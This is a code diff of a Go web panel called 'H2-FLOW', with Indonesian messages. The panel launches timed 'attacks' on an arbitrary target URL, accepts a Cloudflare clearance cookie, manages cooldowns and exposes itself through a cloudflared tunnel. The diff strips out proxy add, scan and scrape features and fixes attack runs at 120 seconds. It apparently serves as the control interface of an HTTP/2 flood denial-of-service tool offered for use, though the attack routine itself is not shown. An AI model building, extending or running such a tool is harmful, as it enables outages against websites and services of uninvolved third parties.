+        }
         .log-content::-webkit-scrollbar { width:4px; }
         .log-content::-webkit-scrollbar-track { background:#0f0f0f; }
         .log-content::-webkit-scrollbar-thumb { background:#2a2a2a; border-radius:4px; }
@@ -1374,7 +1172,6 @@ const webHTML = `<!DOCTYPE html>
             .header { flex-direction:column; align-items:flex-start; gap:6px; }
             .info-grid { grid-template-columns:1fr; gap:4px; }
             .form-row { grid-template-columns:1fr; gap:0; }
-            .proxy-actions { grid-template-columns:1fr 1fr; gap:10px; }
         }
     </style>
 </head>
@@ -1382,7 +1179,7 @@ const webHTML = `<!DOCTYPE html>
 <div class="dashboard">
     <div class="header">
         <h1>H2-<span>FLOW</span></h1>
-        <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">ready</span></div>
+        <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
     </div>
 
     <div class="info-grid">
@@ -1390,19 +1187,17 @@ const webHTML = `<!DOCTYPE html>
         <div class="item"><span class="label">duration</span><span class="value" id="info-duration">—</span></div>
         <div class="item"><span class="label">cookie</span><span class="value" id="info-cookie">—</span></div>
         <div class="item"><span class="label">status</span><span class="value" id="info-status">—</span></div>
-        <div class="item"><span class="label">proxy count</span><span class="value" id="proxy-count">0</span></div>
-        <div class="item"><span class="label">proxy status</span><span class="value" id="proxy-status">—</span></div>
     </div>
 
-    <div class="section-title">New attack</div>
+    <div class="section-title">new attack</div>
     <form id="attack-form" action="/start" method="post">
         <div class="form-group">
-            <label for="target">Target Url</label>
+            <label for="target">Target</label>
             <input type="text" id="target" name="target" placeholder="https://t.me/ytdizflyze" required>
         </div>
         <div class="form-row">
             <div class="form-group">
-                <label for="duration">Duration (max 60s)</label>
+                <label for="duration">Duration (max 60)</label>
                 <input type="number" id="duration" name="duration" value="60" min="1" max="60" required>
             </div>
             <div class="form-group">
@@ -1410,34 +1205,11 @@ const webHTML = `<!DOCTYPE html>
                 <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
             </div>
         </div>
-        <button type="submit" class="btn" id="launchBtn">Launch Attack</button>
+        <button type="submit" class="btn" id="launchBtn">Gass</button>
     </form>
 
-    <div class="section-title">Proxy Control</div>
-    <div class="proxy-actions">
-        <button class="btn" id="addProxyBtn">Add Proxy</button>
-        <button class="btn" id="scanProxyBtn">Scan Proxy</button>
-        <button class="btn" id="stopScanBtn" style="display:none;" class="stop">Stop</button>
-        <button class="btn" id="scrapeProxyBtn">Scrape Proxy</button>
-        <button class="btn" id="stopScrapeBtn" style="display:none;" class="stop">Stop</button>
-    </div>
-
-    <div id="addProxyForm" style="display:none; background:#1a1a2e; padding:20px; border-radius:8px; margin-bottom:20px;">
-        <h3 style="color:#e74c3c;">Add Proxy</h3>
-        <div class="form-group">
-            <label>Upload file proxy.txt</label>
-            <input type="file" id="proxyFile" accept=".txt">
-        </div>
-        <div class="form-group">
-            <label>Paste Proxy</label>
-            <textarea id="proxyText" rows="5" style="width:100%; background:#161616; border:1px solid #2a2a2a; border-radius:4px; color:#e0e0e0; padding:10px;"></textarea>
-        </div>
-        <button class="btn" id="submitProxyBtn" style="background:#2ecc71;">Add</button>
-        <button class="btn" id="cancelProxyBtn" style="background:#555;">Cancel</button>
-    </div>
-
     <div class="log-area">
-        <div class="log-header"><span>activity log</span><span id="log-count">0 events</span></div>
+        <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
         <div class="log-content" id="log-content">[system] Ready</div>
     </div>
 
@@ -1445,169 +1217,103 @@ const webHTML = `<!DOCTYPE html>
 </div>
 
 <script>
-    const statusDot = document.getElementById('statusDot');
-    const statusText = document.getElementById('statusText');
-    const infoStatus = document.getElementById('info-status');
-    const launchBtn = document.getElementById('launchBtn');
-    const proxyCountEl = document.getElementById('proxy-count');
-    const proxyStatusEl = document.getElementById('proxy-status');
-    const log = document.getElementById('log-content');
-    const stopScanBtn = document.getElementById('stopScanBtn');
-    const stopScrapeBtn = document.getElementById('stopScrapeBtn');
+    function updateUI(state, cooldownRemaining) {
+        var dot = document.getElementById('statusDot');
+        var statusText = document.getElementById('statusText');
+        var infoStatus = document.getElementById('info-status');
+        var btn = document.getElementById('launchBtn');
+        var durationInput = document.getElementById('duration');
 
-    function updateUI(state, cooldown, proxyStatus) {
         if (state === 'attacking') {
-            statusDot.className = 'dot busy';
+            dot.className = 'dot busy';
             statusText.textContent = 'attacking';
             infoStatus.textContent = 'attacking';
-            launchBtn.disabled = true;
-            launchBtn.textContent = 'Waiting...';
+            btn.disabled = true;
+            btn.textContent = 'Waiting';
+            durationInput.disabled = true;
         } else if (state === 'cooldown') {
-            statusDot.className = 'dot cooldown';
-            statusText.textContent = 'cooldown ' + cooldown + 's';
-            infoStatus.textContent = 'cooldown (' + cooldown + 's)';
-            launchBtn.disabled = true;
-            launchBtn.textContent = 'Cooldown ' + cooldown + 's';
+            dot.className = 'dot cooldown';
+            statusText.textContent = 'cooldown ' + cooldownRemaining + 's';
+            infoStatus.textContent = 'cooldown (' + cooldownRemaining + 's)';
+            btn.disabled = true;
+            btn.textContent = 'Cooldown ' + cooldownRemaining + 's';
+            durationInput.disabled = true;
         } else {
-            statusDot.className = 'dot ready';
+            dot.className = 'dot ready';
             statusText.textContent = 'ready';
-            infoStatus.textContent = 'idle';
-            launchBtn.disabled = false;
-            launchBtn.textContent = 'Launch Attack';
-        }
-
-        // Proxy status and buttons
-        proxyStatusEl.textContent = proxyStatus || 'idle';
-        if (proxyStatus === 'scanning') {
-            stopScanBtn.style.display = 'inline-block';
-            document.getElementById('scanProxyBtn').style.display = 'none';
-        } else {
-            stopScanBtn.style.display = 'none';
-            document.getElementById('scanProxyBtn').style.display = 'inline-block';
-        }
-        if (proxyStatus === 'scraping') {
-            stopScrapeBtn.style.display = 'inline-block';
-            document.getElementById('scrapeProxyBtn').style.display = 'none';
-        } else {
-            stopScrapeBtn.style.display = 'none';
-            document.getElementById('scrapeProxyBtn').style.display = 'inline-block';
+            infoStatus.textContent = '—';
+            btn.disabled = false;
+            btn.textContent = 'Gass';
+            durationInput.disabled = false;
         }
     }
 
     function fetchStatus() {
         fetch('/status')
-            .then(res => res.json())
-            .then(data => {
-                updateUI(data.state, data.cooldown || 0, data.proxyStatus);
-                proxyCountEl.textContent = data.proxyCount || 0;
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                updateUI(data.state, data.cooldown || 0);
             })
-            .catch(() => {});
+            .catch(function() {  });
     }
+
     fetchStatus();
     setInterval(fetchStatus, 2000);
 
-    function logMsg(msg, cls='') {
-        const time = new Date().toLocaleTimeString();
-        const entry = '[' + time + '] ' + msg;
-        const el = document.createElement('div');
-        el.className = cls;
-        el.textContent = entry;
-        log.prepend(el);
-        while (log.children.length > 20) log.removeChild(log.lastChild);
-        document.getElementById('log-count').textContent = log.children.length + ' events';
-    }
-
     document.getElementById('attack-form').addEventListener('submit', function(e) {
         e.preventDefault();
-        const form = this;
-        const formData = new FormData(form);
-        const target = formData.get('target');
-        const duration = formData.get('duration');
-        const cookie = formData.get('cookie') || '—';
+        var form = this;
+        var formData = new FormData(form);
+        var target = formData.get('target');
+        var duration = formData.get('duration');
+        var cookie = formData.get('cookie') || '—';
 
         document.getElementById('info-target').textContent = target;
         document.getElementById('info-duration').textContent = duration + 's';
         document.getElementById('info-cookie').textContent = cookie;
-        logMsg('attack started on ' + target + ' (' + duration + 's)', 'attack-started');
+
+        var log = document.getElementById('log-content');
+        var time = new Date().toLocaleTimeString();
+        var entry = '[' + time + '] attack started on ' + target + ' (' + duration + 's)';
+        log.innerHTML = '<span class="attack-started">' + entry + '</span>\n' + log.innerHTML;
+        var lines = log.innerHTML.split('\n');
+        if (lines.length > 20) {
+            log.innerHTML = lines.slice(0, 20).join('\n');
+        }
+        document.getElementById('log-count').textContent = (lines.length) + ' events';
 
         fetch('/start', {
             method: 'POST',
             body: formData
-        }).then(res => {
-            if (!res.ok) return res.text().then(t => { throw new Error(t) });
-            return res.text();
-        }).then(text => {
-            logMsg(text, 'info');
-        }).catch(err => {
-            logMsg('error: ' + err.message, 'error');
+        }).then(function(response) {
+            if (response.status === 409) {
+                return response.text().then(function(text) {
+                    throw new Error('Conflict: ' + text);
+                });
+            } else if (response.status === 429) {
+                return response.text().then(function(text) {
+                    throw new Error('Cooldown: ' + text);
+                });
+            }
+            return response.text();
+        }).then(function(text) {
+            var time2 = new Date().toLocaleTimeString();
+            var entry2 = '[' + time2 + '] ' + text;
+            log.innerHTML = entry2 + '\n' + log.innerHTML;
+        }).catch(function(err) {
+            var time2 = new Date().toLocaleTimeString();
+            var entry2 = '[' + time2 + '] error: ' + err.message;
+            log.innerHTML = '<span class="error">' + entry2 + '</span>\n' + log.innerHTML;
             fetchStatus();
         });
     });
 
-    document.getElementById('addProxyBtn').addEventListener('click', function() {
-        const form = document.getElementById('addProxyForm');
-        form.style.display = form.style.display === 'none' ? 'block' : 'none';
-    });
-    document.getElementById('cancelProxyBtn').addEventListener('click', function() {
-        document.getElementById('addProxyForm').style.display = 'none';
-    });
-
-    document.getElementById('submitProxyBtn').addEventListener('click', function() {
-        const fileInput = document.getElementById('proxyFile');
-        const textarea = document.getElementById('proxyText');
-        const formData = new FormData();
-        if (fileInput.files.length > 0) {
-            formData.append('proxyfile', fileInput.files[0]);
-        } else if (textarea.value.trim() !== '') {
-            formData.append('proxy', textarea.value);
-        } else {
-            logMsg('Please provide proxies', 'error');
-            return;
-        }
-        logMsg('Menambahkan Proxy...', 'info');
-        fetch('/addproxy', {
-            method: 'POST',
-            body: formData
-        }).then(res => res.text())
-          .then(text => {
-              logMsg(text, 'info');
-              document.getElementById('addProxyForm').style.display = 'none';
-              fileInput.value = '';
-              textarea.value = '';
-              fetchStatus();
-          })
-          .catch(err => logMsg('error: ' + err.message, 'error'));
-    });
-
-    document.getElementById('scanProxyBtn').addEventListener('click', function() {
-        logMsg('Melakukan Scan...', 'info');
-        fetch('/scanproxy', { method: 'POST' })
-            .then(res => res.text())
-            .then(text => { logMsg(text, 'info'); fetchStatus(); })
-            .catch(err => logMsg('error: ' + err.message, 'error'));
-    });
-
-    document.getElementById('stopScanBtn').addEventListener('click', function() {
-        fetch('/stopscan', { method: 'POST' })
-            .then(res => res.text())
-            .then(text => { logMsg(text, 'info'); fetchStatus(); })
-            .catch(err => logMsg('error: ' + err.message, 'error'));
-    });
-
-    document.getElementById('scrapeProxyBtn').addEventListener('click', function() {
-        logMsg('Scrape proxies...', 'info');
-        fetch('/scrapeproxy', { method: 'POST' })
-            .then(res => res.text())
-            .then(text => { logMsg(text, 'info'); fetchStatus(); })
-            .catch(err => logMsg('error: ' + err.message, 'error'));
-    });
-
-    document.getElementById('stopScrapeBtn').addEventListener('click', function() {
-        fetch('/stopscrape', { method: 'POST' })
-            .then(res => res.text())
-            .then(text => { logMsg(text, 'info'); fetchStatus(); })
-            .catch(err => logMsg('error: ' + err.message, 'error'));
-    });
+    function updateLogCount() {
+        var log = document.getElementById('log-content');
+        var lines = log.innerHTML.split('\n').filter(function(l) { return l.trim() !== ''; });
+        document.getElementById('log-count').textContent = lines.length + ' events';
+    }
+    updateLogCount();
 </script>
 </body>
 </html>`
@@ -1634,30 +1340,16 @@ func startWebAndTunnel() {
 			if rem > 0 {
 				cooldown = int(rem.Seconds()) + 1
 			} else {
-				attackState = "—"
-				state = "—"
+				cooldown = 0
+				if attackState == "cooldown" {
+					attackState = "—"
+					state = "—"
+				}
 			}
 		}
 		stateMutex.Unlock()
-
-		proxyCount := proxyManager.Count()
-
-		scanMutex.Lock()
-		scanRunning := scanRunning
-		scanMutex.Unlock()
-		scrapeMutex.Lock()
-		scrapeRunning := scrapeRunning
-		scrapeMutex.Unlock()
-
-		proxyStatus := "—"
-		if scanRunning {
-			proxyStatus = "scanning"
-		} else if scrapeRunning {
-			proxyStatus = "scraping"
-		}
-
 		w.Header().Set("Content-Type", "application/json")
-		fmt.Fprintf(w, `{"state":"%s","cooldown":%d,"proxyCount":%d,"proxyStatus":"%s"}`, state, cooldown, proxyCount, proxyStatus)
+		fmt.Fprintf(w, `{"state":"%s","cooldown":%d}`, state, cooldown)
 	})
 
 	http.HandleFunc("/start", func(w http.ResponseWriter, r *http.Request) {
@@ -1669,40 +1361,22 @@ func startWebAndTunnel() {
 		tunnelMutex.Lock()
 		if !tunnelReady {
 			tunnelMutex.Unlock()
-			http.Error(w, "Tunnel not ready", http.StatusServiceUnavailable)
+			http.Error(w, "Tunnel not ready yet", http.StatusServiceUnavailable)
 			return
 		}
 		tHost := tunnelHost
 		tunnelMutex.Unlock()
 
-		stateMutex.Lock()
-		state := attackState
-		if state == "cooldown" {
-			rem := time.Until(cooldownUntil)
-			if rem > 0 {
-				stateMutex.Unlock()
-				http.Error(w, fmt.Sprintf("Cooldown %d seconds", int(rem.Seconds())+1), http.StatusTooManyRequests)
-				return
-			} else {
-				attackState = "—"
-			}
-		}
-		if attackState == "attacking" {
-			stateMutex.Unlock()
-			http.Error(w, "Attack already running", http.StatusConflict)
-			return
-		}
-		attackState = "attacking"
-		stateMutex.Unlock()
-
 		target := r.FormValue("target")
 		durationStr := r.FormValue("duration")
-		inputDur, err := strconv.Atoi(durationStr)
-		if err != nil || inputDur <= 0 || inputDur > 60 {
+		cookie := r.FormValue("cookie")
+
+		dur, err := strconv.Atoi(durationStr)
+		if err != nil || dur <= 0 {
 			stateMutex.Lock()
 			attackState = "—"
 			stateMutex.Unlock()
-			http.Error(w, "Durasi Hanya Boleh 1-60s", http.StatusBadRequest)
+			http.Error(w, "Invalid duration", http.StatusBadRequest)
 			return
 		}
 		if target == "" {
@@ -1713,183 +1387,64 @@ func startWebAndTunnel() {
 			return
 		}
 
-		// Self-attack prevention
-		if u, err := url.Parse(target); err == nil {
-			if u.Hostname() == tHost {
-				stateMutex.Lock()
-				attackState = "—"
-				stateMutex.Unlock()
-				http.Error(w, "GOBLOK JANGAN WEB INI JUGA", http.StatusBadRequest)
-				return
+		parsedTarget, err := url.Parse(target)
+		if err != nil {
+			stateMutex.Lock()
+			attackState = "—"
+			stateMutex.Unlock()
+			http.Error(w, "Invalid target URL", http.StatusBadRequest)
+			return
+		}
+		targetHost := parsedTarget.Hostname()
+
+		normalize := func(h string) string {
+			h = strings.ToLower(h)
+			if strings.HasPrefix(h, "www.") {
+				h = h[4:]
 			}
+			return h
 		}
 
-		realDuration := inputDur * 2
-		cookie := r.FormValue("cookie")
+		if normalize(targetHost) == normalize(tHost) {
+			stateMutex.Lock()
+			attackState = "—"
+			stateMutex.Unlock()
+			http.Error(w, "You Are IDIOT", http.StatusBadRequest)
+			return
+		}
+
+		stateMutex.Lock()
+		state := attackState
+		if state == "cooldown" {
+			rem := time.Until(cooldownUntil)
+			if rem > 0 {
+				cooldown := int(rem.Seconds()) + 1
+				stateMutex.Unlock()
+				http.Error(w, fmt.Sprintf("Cooldown %d seconds remaining", cooldown), http.StatusTooManyRequests)
+				return
+			} else {
+				attackState = "—"
+				state = "—"
+			}
+		}
+		if state == "attacking" {
+			stateMutex.Unlock()
+			http.Error(w, "Attack already running. Please wait.", http.StatusConflict)
+			return
+		}
+		attackState = "attacking"
+		stateMutex.Unlock()
 
 		go func() {
-			runAttack(target, realDuration, cookie)
+			runAttack(target, 120, cookie)
 			stateMutex.Lock()
 			attackState = "cooldown"
 			cooldownUntil = time.Now().Add(30 * time.Second)
 			stateMutex.Unlock()
 		}()
 
-		fmt.Fprintf(w, "Attack started on %s for %d seconds", target, realDuration)
-	})
-
-	http.HandleFunc("/addproxy", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
-		var proxies []Proxy
-
-		file, _, err := r.FormFile("proxyfile")
-		if err == nil {
-			defer file.Close()
-			scanner := bufio.NewScanner(file)
-			for scanner.Scan() {
-				line := strings.TrimSpace(scanner.Text())
-				if line == "" {
-					continue
-				}
-				ip, port := parseLine(line)
-				if ip != "" && port != "" {
-					proxies = append(proxies, Proxy{ip, port})
-				}
-			}
-		} else {
-			proxyText := r.FormValue("proxy")
-			lines := strings.Split(proxyText, "\n")
-			for _, line := range lines {
-				line = strings.TrimSpace(line)
-				if line == "" {
-					continue
-				}
-				ip, port := parseLine(line)
-				if ip != "" && port != "" {
-					proxies = append(proxies, Proxy{ip, port})
-				}
-			}
-		}
-
-		if len(proxies) == 0 {
-			http.Error(w, "No valid proxies found", http.StatusBadRequest)
-			return
-		}
-		added := proxyManager.Add(proxies)
-		fmt.Fprintf(w, "Added %d new proxies", added)
-	})
-
-	http.HandleFunc("/scanproxy", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
-		scanMutex.Lock()
-		if scanRunning {
-			scanMutex.Unlock()
-			http.Error(w, "Scan already running", http.StatusConflict)
-			return
-		}
-		// Create cancellable context
-		ctx, cancel := context.WithCancel(context.Background())
-		scanCtx = ctx
-		scanCancel = cancel
-		scanRunning = true
-		scanMutex.Unlock()
-
-		go func() {
-			defer func() {
-				scanMutex.Lock()
-				scanRunning = false
-				scanMutex.Unlock()
-			}()
-			proxies := proxyManager.GetProxies()
-			alive := checkProxies(proxies, scanCtx)
-			if scanCtx.Err() != nil {
-				return // cancelled
-			}
-			aliveMap := make(map[string]bool)
-			for _, p := range alive {
-				aliveMap[p.IP+":"+p.Port] = true
-			}
-			var dead []string
-			for _, p := range proxies {
-				if !aliveMap[p.IP+":"+p.Port] {
-					dead = append(dead, p.IP+":"+p.Port)
-				}
-			}
-			proxyManager.RemoveDead(dead)
-		}()
-		fmt.Fprintf(w, "Scan started")
-	})
-
-	http.HandleFunc("/stopscan", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
-		scanMutex.Lock()
-		if scanRunning && scanCancel != nil {
-			scanCancel()
-			scanMutex.Unlock()
-			fmt.Fprintf(w, "Scan stopped")
-		} else {
-			scanMutex.Unlock()
-			http.Error(w, "No scan running", http.StatusBadRequest)
-		}
-	})
-
-	http.HandleFunc("/scrapeproxy", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
-		scrapeMutex.Lock()
-		if scrapeRunning {
-			scrapeMutex.Unlock()
-			http.Error(w, "Scrape already running", http.StatusConflict)
-			return
-		}
-		ctx, cancel := context.WithCancel(context.Background())
-		scrapeCtx = ctx
-		scrapeCancel = cancel
-		scrapeRunning = true
-		scrapeMutex.Unlock()
-
-		go func() {
-			defer func() {
-				scrapeMutex.Lock()
-				scrapeRunning = false
-				scrapeMutex.Unlock()
-			}()
-			scraped := scrapeProxies(scrapeCtx)
-			if scrapeCtx.Err() != nil {
-				return
-			}
-			if len(scraped) > 0 {
-				proxyManager.Add(scraped)
-			}
-		}()
-		fmt.Fprintf(w, "Scrape started")
-	})
-
-	http.HandleFunc("/stopscrape", func(w http.ResponseWriter, r *http.Request) {
-		if r.Method != http.MethodPost {
-			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-			return
-		}
-		scrapeMutex.Lock()
-		if scrapeRunning && scrapeCancel != nil {
-			scrapeCancel()
-			scrapeMutex.Unlock()
-			fmt.Fprintf(w, "Scrape stopped")
-		} else {
-			scrapeMutex.Unlock()
-			http.Error(w, "No scrape running", http.StatusBadRequest)
-		}
+		w.WriteHeader(http.StatusOK)
+		fmt.Fprintf(w, "Attack started on %s for 120 seconds", target)
 	})
 
 	server := &http.Server{Addr: fmt.Sprintf(":%d", port)}
@@ -1942,7 +1497,7 @@ func startWebAndTunnel() {
 
 	if err := cmd.Start(); err != nil {
 		fmt.Println("Gagal menjalankan cloudflared:", err)
-		fmt.Println("Pastikan cloudflared sudah terinstall")
+		fmt.Println("Pastikan cloudflared sudah terinstall (https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/)")
 		os.Exit(1)
 	}
 
@@ -1959,7 +1514,7 @@ func startWebAndTunnel() {
 	}
 
 	if tunnelURL == "" {
-		fmt.Println("Tidak dapat menemukan URL tunnel.")
+		fmt.Println("Tidak dapat menemukan URL tunnel dari output cloudflared.")
 	} else {
 		fmt.Printf("\n🌐 Tunnel URL: %s\n", tunnelURL)
 	}
@@ -1976,8 +1531,6 @@ func startWebAndTunnel() {
 }
 
 func main() {
-	proxyManager = NewProxyManager("proxy.txt")
-
 	if len(os.Args) == 1 {
 		startWebAndTunnel()
 		return
@@ -1992,7 +1545,7 @@ func main() {
 	if len(os.Args) >= 3 {
 		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
 			if d > 120 {
-				fmt.Println("MAX DURASI 120s")
+				fmt.Println("Durasi maksimal 120 detik, diatur ke 120")
 				dur = 120
 			} else {
 				dur = d
